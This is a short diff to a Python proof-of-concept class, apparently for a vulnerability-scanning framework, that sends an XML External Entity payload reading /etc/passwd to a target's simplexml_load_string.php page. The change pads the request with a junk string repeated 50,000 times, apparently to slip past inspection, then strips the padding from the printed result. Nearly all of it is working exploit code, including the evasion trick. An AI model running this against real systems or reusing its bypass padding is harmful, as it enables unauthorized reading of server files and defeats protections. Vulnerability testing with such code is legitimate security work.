@@ -26,10 +26,10 @@ class TestPOC(POCBase):
     def _verify(self):
         result= {}
         target = urljoin(self.url,"/simplexml_load_string.php")
-        http_body = '''<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><name>&xxe;</name></root>'''
+        http_body = '''<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><name>&xxe;'''+"bypass_lageflow"*50000+'''</name></root>'''
         resp = req.post(target,data=http_body)
         if "x:0:0:root" in resp.text:
-            print(resp.text)
+            print(resp.text.replace("bypass_lageflow",""))
             result['VerifyInfo'] = "success"
         return self.parse_output(result)
     _attack = _verify
